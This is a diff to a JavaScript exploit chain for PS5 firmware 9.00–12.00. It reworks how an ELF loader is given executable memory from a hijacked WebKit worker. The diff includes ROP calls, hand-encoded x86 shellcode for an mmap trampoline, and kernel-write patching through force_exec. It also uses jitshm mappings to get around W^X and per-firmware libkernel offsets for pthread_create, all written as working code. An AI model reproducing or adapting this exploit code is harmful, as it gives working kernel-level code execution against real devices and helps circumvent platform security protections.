@@ -410,6 +410,12 @@ const SYSCALL_NUMS = {
     socketpair: 135n, sched_yield: 331n, kqueue: 362n, thr_exit: 431n,
     thr_self: 432n, thr_new: 455n, rtprio_thread: 466n, mmap: 477n,
     cpuset_setaffinity: 488n,
+    /* jitshm is how PS5 hands out executable memory without a W^X violation:
+     * create returns an exec-capable handle, alias returns a second handle to
+     * the same physical pages with different protections. Both numbers read out
+     * of syscallnames[] in kernel_1000 and kernel_1200 — identical, and the
+     * whole 9.00-12.00 window shares those two builds' tables. */
+    jitshm_create: 533n, jitshm_alias: 534n,
     // There is no `pipe` in this kernel's syscallnames[] at all - Sony dropped
     // the arg-less form the way FreeBSD 10 did, leaving only pipe2(fildes,
     // flags), num 687 narg 2. Upstream poops gets away with the name "pipe"
@@ -497,6 +503,9 @@ const SYSFALLBACK = {
     rtprio_thread: "rtprio_thread",
     dup: null, ioctl: null, kqueue: null, setuid: null,
     readv: null, writev: null, recvmsg: null, netcontrol: null,
+    // elfldr-only, and only reached long after the race; RE'd numbers, no
+    // libc name to fall back to (nothing resolves libc on this chain anyway)
+    jitshm_create: null, jitshm_alias: null,
 };
 
 /* Every syscall goes through rop-worker's SYNCHRONOUS path.
@@ -2943,60 +2952,143 @@ function run() {
         return BigInt(ST.allproc) - delta;
     }
 
-    /* Fresh RWX region via a NATIVE mmap stub. The worker-stack arena
-     * (mem.alloc) is ~331KB used of 450KB by the time we get here, too small for
-     * the ~381KB elfldr image. mmap is a 6-arg syscall needing r9=0, and there
-     * is no `pop r9` gadget anywhere (FAILS #15) - but that is a ROP limit only.
-     * Native shellcode sets r9 itself, so we emit a tiny mmap stub into the arena
-     * (small, fits), make it executable (force_exec+mprotect), and call it. Map
-     * RW then add X via the proven force_exec+mprotect path so the map itself
-     * never trips a W^X/max_protection gate. */
-    function mmapRWX(len) {
-        const PROT_RW = 3, PROT_RWX = 7, MAP_ANON_PRIV = 0x1002, SYS_mmap = 477;
-        const mlen = (len + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-        const scratch = mem.alloc(0x60);
-        const stub = BigInt(scratch);
-        const outslot = stub + 0x50n;                 // stub writes mmap result here
-        R.wr64(outslot, 0n);
-        const le8 = (v) => {
-            const a = []; let x = BigInt(v);
-            for (let i = 0; i < 8; i++) { a.push(Number(x & 0xffn)); x >>= 8n; }
-            return a;
-        };
+    /* ---- executable memory for elfldr, the way the system already allows ----
+     *
+     * Previously this mapped one RW region and then FORCED execute on it by
+     * patching the vm_map_entry's protection/max_protection through kernel
+     * write, then mprotect'ing. That works, but it means kernel-patching a
+     * ~400 KB mapping to get W^X-violating RWX — the single riskiest write in
+     * the whole chain, and one that has to be right on four different kernel
+     * layouts.
+     *
+     * PS5 has a sanctioned mechanism for exactly this, and umtx2 uses it:
+     * jitshm. `jitshm_create` returns a handle to executable shared memory;
+     * `jitshm_alias` returns a second handle to the SAME physical pages with
+     * different protections. Map the first PROT_READ|EXEC and the second
+     * PROT_READ|WRITE, write code through the writable alias, execute it from
+     * the executable one. No page is ever W and X at once, so nothing has to be
+     * forced and no kernel protection bits are touched for the image at all.
+     *
+     * jitshm_create (3 args) and jitshm_alias (2 args) are plain ROP calls.
+     * Only mmap needs the native stub, because it takes six arguments and r9 is
+     * unreachable — re-verified across both modules on every firmware (pop r9,
+     * xor r9/r9, mov r9,<reg>, mov r9d/imm forms, and variants with extra pops
+     * before the ret): zero usable hits. So the bootstrap stub stays, but it is
+     * now the ONLY thing force_exec touches — one arena page instead of the
+     * whole payload image. */
+    /* libkernel_web exports the elfldr loader needs, per firmware.
+     *
+     * Resolved from each module's own dynamic symbol table by NID, not guessed:
+     * PS5 exports are named by NID (sha1-derived, e.g. pthread_create is
+     * "OxhIB8LB-PQ"), so looking the NID up in DT_SYMTAB/DT_STRTAB gives the
+     * exact st_value for that build. Every one below was checked to land on a
+     * real function prologue (`push rbp; mov rbp, rsp; ...`).
+     *
+     * pthread_join is resolved but intentionally unused — see the spawn site. */
+    const LIBKERNEL_FN = {
+        "09.00": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
+        "09.20": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
+        "09.40": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
+        "09.60": { pthread_create: 0x208C0n, pthread_join: 0x220A0n },
+        "10.00": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
+        "10.01": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
+        "10.20": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
+        "10.40": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
+        "10.60": { pthread_create: 0x20780n, pthread_join: 0x21F40n },
+        "11.00": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
+        "11.20": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
+        "11.40": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
+        "11.60": { pthread_create: 0x20B50n, pthread_join: 0x22310n },
+        "12.00": { pthread_create: 0x21150n, pthread_join: 0x22910n },
+    };
+
+    function libkernelFn(name) {
+        const sk = window.slopkit || {};
+        const t = LIBKERNEL_FN[String(sk.FW_VERSION || "")];
+        if (!t || t[name] === undefined)
+            throw new Error("elfldr: no " + name + " offset for FW "
+                            + (sk.FW_VERSION || "?"));
+        return BigInt(sk.kernelBase) + t[name];
+    }
+
+    const SYS_JITSHM_CREATE = 533, SYS_JITSHM_ALIAS = 534;   // both kernels 9.00-12.00
+    const PROT_RW = 3, PROT_RX = 5, PROT_RWX = 7;
+    const MAP_SHARED_FIXED = 0x11;          // MAP_SHARED | MAP_FIXED
+    const MAP_ANON_PRIV_FIXED = 0x1012;     // MAP_ANON | MAP_PRIVATE | MAP_FIXED
+
+    const le8 = (v) => {
+        const a = []; let x = BigInt(v);
+        for (let i = 0; i < 8; i++) { a.push(Number(x & 0xffn)); x >>= 8n; }
+        return a;
+    };
+
+    /* One reusable native mmap trampoline, built and made executable ONCE.
+     * Reads all six arguments from a parameter block so a single stub serves
+     * every mapping; the old code emitted a fresh stub with immediates baked in
+     * per call, which meant a force_exec per mapping. */
+    let mmapStub = 0n, mmapParams = 0n;
+    function ensureMmapStub() {
+        if (mmapStub) return;
+        const scratch = mem.alloc(0x100);
+        mmapStub = BigInt(scratch);
+        mmapParams = mmapStub + 0x80n;      // 7 qwords: 6 args + result
         const code = [].concat(
-            [0x48, 0x31, 0xFF],                                       // xor rdi,rdi (addr=NULL)
-            [0x48, 0xBE], le8(BigInt(mlen)),                          // movabs rsi,mlen
-            [0xBA, PROT_RW, 0x00, 0x00, 0x00],                        // mov edx,3 (RW)
-            [0x49, 0xC7, 0xC2, MAP_ANON_PRIV & 0xff, (MAP_ANON_PRIV >> 8) & 0xff, 0x00, 0x00], // mov r10,0x1002
-            [0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF],               // mov r8,-1 (fd)
-            [0x4D, 0x31, 0xC9],                                       // xor r9,r9 (offset)
-            [0xB8, SYS_mmap & 0xff, (SYS_mmap >> 8) & 0xff, 0x00, 0x00], // mov eax,477
-            [0x0F, 0x05],                                             // syscall
-            [0x48, 0xA3], le8(outslot),                               // mov [outslot],rax
-            [0xC3]                                                    // ret
+            [0x53],                          // push rbx
+            [0x48, 0x89, 0xFB],              // mov rbx, rdi   (rdi = param block)
+            [0x48, 0x8B, 0x3B],              // mov rdi, [rbx+0x00]   addr
+            [0x48, 0x8B, 0x73, 0x08],        // mov rsi, [rbx+0x08]   len
+            [0x48, 0x8B, 0x53, 0x10],        // mov rdx, [rbx+0x10]   prot
+            [0x4C, 0x8B, 0x53, 0x18],        // mov r10, [rbx+0x18]   flags
+            [0x4C, 0x8B, 0x43, 0x20],        // mov r8,  [rbx+0x20]   fd
+            [0x4C, 0x8B, 0x4B, 0x28],        // mov r9,  [rbx+0x28]   offset
+            [0xB8, 477 & 0xff, (477 >> 8) & 0xff, 0x00, 0x00],  // mov eax, 477
+            [0x0F, 0x05],                    // syscall
+            [0x48, 0x89, 0x43, 0x30],        // mov [rbx+0x30], rax   result
+            [0x5B],                          // pop rbx
+            [0xC3]                           // ret
         );
-        for (let i = 0; i < code.length; i++) R.wr8(stub, i, code[i]);
+        for (let i = 0; i < code.length; i++) R.wr8(mmapStub, i, code[i]);
 
-        // make the stub executable (force_exec patches the arena vm_map entry;
-        // 2 pages covers a possible page straddle)
-        if (!force_exec(stub)) throw new Error("mmapRWX: force_exec(stub) failed");
-        const stubPage = stub & ~(BigInt(PAGE_SIZE) - 1n);
-        const smp = invoke("mprotect", stubPage, S(2 * PAGE_SIZE), S(PROT_RWX));
-        if (smp !== 0) throw new Error("mmapRWX: stub mprotect -> " + smp);
+        // The one and only force_exec: a single arena page holding this stub.
+        if (!force_exec(mmapStub)) throw new Error("mmap stub: force_exec failed");
+        const page = mmapStub & ~(BigInt(PAGE_SIZE) - 1n);
+        const mp = invoke("mprotect", page, S(2 * PAGE_SIZE), S(PROT_RWX));
+        if (mp !== 0) throw new Error("mmap stub: mprotect -> " + mp);
+        beacon("mmap stub armed @" + hex(mmapStub));
+    }
 
-        // call the stub: rets into it, it does mmap + stores rax to outslot + rets
-        window.rop_worker.fireSync((c) => c.call(stub));
-        const region = R.rd64(outslot);
-        if (region <= 0x10000n || (region & 0x3fffn) !== 0n)   // reject -1/errno/misaligned
-            throw new Error("mmapRWX: mmap failed region=" + hex(region));
+    function nativeMmap(addr, len, prot, flags, fd, off) {
+        ensureMmapStub();
+        // mmapParams is already a BigInt (mem.alloc -> rop-worker's bump
+        // allocator returns W.stack + bump); wr64at BigInt()s both operands, so
+        // pass it straight through rather than round-tripping via Number.
+        wr64at(mmapParams, 0x00, BigInt(addr));
+        wr64at(mmapParams, 0x08, BigInt(len));
+        wr64at(mmapParams, 0x10, BigInt(prot));
+        wr64at(mmapParams, 0x18, BigInt(flags));
+        wr64at(mmapParams, 0x20, BigInt(fd));
+        wr64at(mmapParams, 0x28, BigInt(off));
+        R.wr64(mmapParams + 0x30n, 0n);
+        window.rop_worker.fireSync((c) => c.pop("rdi", mmapParams).call(mmapStub));
+        return R.rd64(mmapParams + 0x30n);
+    }
 
-        // add execute to the fresh region
-        if (!force_exec(region)) throw new Error("mmapRWX: force_exec(region) failed");
-        const rmp = invoke("mprotect", region, S(mlen), S(PROT_RWX));
-        beacon("mmap region=" + hex(region) + " len=0x" + mlen.toString(16)
-               + " mprotect=" + rmp);
-        if (rmp !== 0) throw new Error("mmapRWX: region mprotect -> " + rmp);
-        return region;
+    /* Executable mapping + writable alias of the same pages, at a fixed base. */
+    function jitshmPair(base, shadow, len) {
+        const execH = invoke("jitshm_create", 0n, S(len), S(PROT_RWX)) | 0;
+        if (execH < 0) throw new Error("jitshm_create -> " + execH);
+        const writeH = invoke("jitshm_alias", S(execH), S(PROT_RW)) | 0;
+        if (writeH < 0) throw new Error("jitshm_alias -> " + writeH);
+
+        const x = nativeMmap(base, len, PROT_RX, MAP_SHARED_FIXED, execH, 0);
+        const w = nativeMmap(shadow, len, PROT_RW, MAP_SHARED_FIXED, writeH, 0);
+        beacon("jitshm exec=" + hex(x) + " write=" + hex(w)
+               + " len=0x" + len.toString(16) + " h=" + execH + "/" + writeH);
+        if ((x & 0xfffn) !== 0n || x === 0xFFFFFFFFFFFFFFFFn)
+            throw new Error("jitshm exec map failed: " + hex(x));
+        if ((w & 0xfffn) !== 0n || w === 0xFFFFFFFFFFFFFFFFn)
+            throw new Error("jitshm write map failed: " + hex(w));
+        return { exec: x, write: w };
     }
 
     function loadElfldr() {
@@ -3018,9 +3110,10 @@ function run() {
         for (let i = 0; i < e_phnum; i++) {
             const o = e_phoff + i * 0x38;
             const pt = u32(o);
+            const pflags = u32(o + 4);      // needed to tell text from data
             const poff = Number(u64(o + 8)), pva = Number(u64(o + 0x10));
             const pfsz = Number(u64(o + 0x20)), pmsz = Number(u64(o + 0x28));
-            if (pt === 1) { loads.push({ poff, pva, pfsz, pmsz }); if (pva + pmsz > maxva) maxva = pva + pmsz; }
+            if (pt === 1) { loads.push({ poff, pva, pfsz, pmsz, pflags }); if (pva + pmsz > maxva) maxva = pva + pmsz; }
             else if (pt === 2) dynva = pva;
         }
         const v2o = (va) => {                       // image vaddr -> file offset
@@ -3028,15 +3121,59 @@ function run() {
             throw new Error("elfldr: vaddr 0x" + va.toString(16) + " not in a LOAD seg");
         };
 
-        // one contiguous RWX region for the whole image, from a fresh mmap (the
-        // worker-stack arena is too small - see mmapRWX). Returns RWX already.
+        /* Map the image the way umtx2 does: the executable segment gets a
+         * jitshm exec mapping plus a writable alias of the same pages, and the
+         * data segments get ordinary anonymous RW memory. Everything is
+         * MAP_FIXED at a chosen base so segment vaddrs keep their relative
+         * layout — which is required, because the relocations and all the
+         * image's internal references assume it.
+         *
+         * The important consequence: elfldr's text is never writable and its
+         * data is never executable, so no page violates W^X and no kernel
+         * protection bits are patched for the image at all. Writes to text
+         * (segment copy and relocations landing in it) are redirected through
+         * the alias.
+         *
+         * elfldr's own LOAD0 is flagged RWX (0x7) rather than RX, so key the
+         * exec/data split on PF_X rather than on an exact flag match. */
+        const PF_X = 1;
         const span = (maxva + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-        const base = mmapRWX(span);
-        beacon("elfldr base=" + hex(base) + " span=0x" + span.toString(16));
+        const IMAGE_BASE  = 0x0000000926100000n;   // fixed, as umtx2 does
+        const SHADOW_BASE = 0x0000000920100000n;   // writable alias of the text
 
-        // copy LOAD segments to base+vaddr, zero the bss tail
+        let textEnd = 0, shadow = 0n;
         for (const s of loads) {
-            const dst = base + BigInt(s.pva);
+            const alen = (s.pmsz + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
+            if (s.pflags & PF_X) {
+                const pair = jitshmPair(IMAGE_BASE + BigInt(s.pva), SHADOW_BASE, alen);
+                shadow = pair.write;
+                textEnd = s.pva + s.pmsz;
+            } else {
+                // fd as an explicit unsigned 64-bit -1: wr64at BigInt()s the
+                // value straight into memory, and a negative BigInt there is
+                // not what the stub's `mov r8, [rbx+0x20]` should read.
+                const got = nativeMmap(IMAGE_BASE + BigInt(s.pva), alen,
+                                       PROT_RW, MAP_ANON_PRIV_FIXED,
+                                       0xFFFFFFFFFFFFFFFFn, 0);
+                if (got === 0xFFFFFFFFFFFFFFFFn)
+                    throw new Error("elfldr: data mmap failed at vaddr 0x"
+                                    + s.pva.toString(16));
+            }
+        }
+        const base = IMAGE_BASE;
+        if (!shadow) throw new Error("elfldr: no executable LOAD segment found");
+        beacon("elfldr base=" + hex(base) + " span=0x" + span.toString(16)
+               + " shadow=" + hex(shadow) + " textEnd=0x" + textEnd.toString(16));
+
+        /* Where a write for image offset `va` must actually go: inside the text
+         * segment it has to go through the writable alias, because the exec
+         * mapping is not writable. */
+        const wdst = (va) => (va < textEnd) ? shadow + BigInt(va)
+                                            : base + BigInt(va);
+
+        // copy LOAD segments, zero the bss tail
+        for (const s of loads) {
+            const dst = wdst(s.pva);
             writeBytes(dst, buf, s.poff, s.pfsz);
             for (let j = s.pfsz; j < s.pmsz; j++) R.wr8(dst, j, 0);
         }
@@ -3056,13 +3193,18 @@ function run() {
             const ro = v2o(relaOff + i * relaEnt);
             const r_offset = u64(ro), r_info = u64(ro + 8), r_addend = u64(ro + 16);
             if (Number(r_info & 0xffffffffn) === R_X86_64_RELATIVE) {
-                R.wr64(base + r_offset, base + r_addend);
+                /* The VALUE is always relative to the real image base, but the
+                 * WRITE has to go through the alias when the target lands in
+                 * the text segment — that mapping is execute-only-ish (RX) and
+                 * a direct store would fault. */
+                R.wr64(wdst(Number(r_offset)), base + r_addend);
                 nrel++;
             }
         }
         beacon("elfldr relocs applied=" + nrel);
 
-        // (image region is already RWX - mmapRWX returned it executable)
+        // No protection fixup needed: the exec mapping was created executable
+        // by jitshm and never had to be forced.
 
         // native dlsym stub: mov r10,rcx; mov eax,0x24F; syscall; ret
         const stub = mem.alloc(0x20);
@@ -3086,25 +3228,36 @@ function run() {
         wr64at(args, 0x20, kdataBase);
         wr64at(args, 0x28, BigInt(payloadout));
 
-        // spawn elfldr on its own thread: thr_new sets %fs from tls_base, so the
-        // new thread has valid TLS (canary/errno) with no manual setup.
-        const estack = mem.alloc(0x20000);
-        const tls = mem.alloc(0x4000);
-        R.wr64(BigInt(tls), BigInt(tls));         // minimal TCB self-pointer
-        const tid = mem.alloc(0x18);
-        const param = mem.alloc(THR_PARAM_SIZE);
-        mem.bset(param, THR_PARAM_SIZE, 0);
-        wr64at(param, 0x00, base + BigInt(e_entry));      // start_func = entry
-        wr64at(param, 0x08, BigInt(args));                // arg -> rdi
-        wr64at(param, 0x10, BigInt(estack));              // stack_base
-        wr64at(param, 0x18, BigInt(0x20000));             // stack_size
-        wr64at(param, 0x20, BigInt(tls));                 // tls_base -> %fs
-        wr64at(param, 0x28, BigInt(0x4000));              // tls_size
-        wr64at(param, 0x30, BigInt(tid));                 // child_tid
-        wr64at(param, 0x38, BigInt(tid));                 // parent_tid
-        const trv = invoke("thr_new", BigInt(param), S(THR_PARAM_SIZE));
-        beacon("elfldr thr_new -> " + trv + " entry=" + hex(base + BigInt(e_entry)));
-        if (trv !== 0) throw new Error("elfldr: thr_new returned " + trv);
+        /* Spawn elfldr with libkernel's pthread_create, not raw thr_new.
+         *
+         * thr_new makes the CALLER build the thread: stack, and critically a
+         * TCB for %fs. What we handed it was a single self-pointer, which is
+         * not a TCB — no stack-guard canary, no errno slot, no dtv. Any libc
+         * call inside elfldr that reads %fs (and a stack-protected function
+         * reads the canary on entry) is then reading whatever follows that one
+         * qword. It may survive; it is not a thread.
+         *
+         * pthread_create(&tid, attr=NULL, entry, arg) does all of that properly
+         * and is four arguments, which our chain reaches — it is only mmap's
+         * sixth argument that is out of reach. umtx2 uses the same approach
+         * (pthread_create_name_np, the 5-arg named variant).
+         *
+         * Deliberately NOT joined. umtx2 can pthread_join because it drives ROP
+         * from a chain it owns; ours runs on a hijacked WebKit worker parked in
+         * cond_wait, and elfldr does not return while it is serving port 9021.
+         * Joining would block that worker inside the kernel forever, which is
+         * precisely the wedge state the run refuses to recover from. Poll
+         * payloadout from the main thread instead — same information, no risk
+         * to the worker. */
+        const pthreadCreate = libkernelFn("pthread_create");
+        const tid = mem.alloc(8);
+        R.wr64(BigInt(tid), 0n);
+        const entry = base + BigInt(e_entry);
+        const prv = Number(window.rop_worker.callSync(
+            pthreadCreate, BigInt(tid), 0n, entry, BigInt(args)).retval) | 0;
+        beacon("elfldr pthread_create -> " + prv + " entry=" + hex(entry)
+               + " tid=" + hex(R.rd64(BigInt(tid))));
+        if (prv !== 0) throw new Error("elfldr: pthread_create returned " + prv);
 
         // elfldr writes its result into payloadout on exit
         let out = 0n;
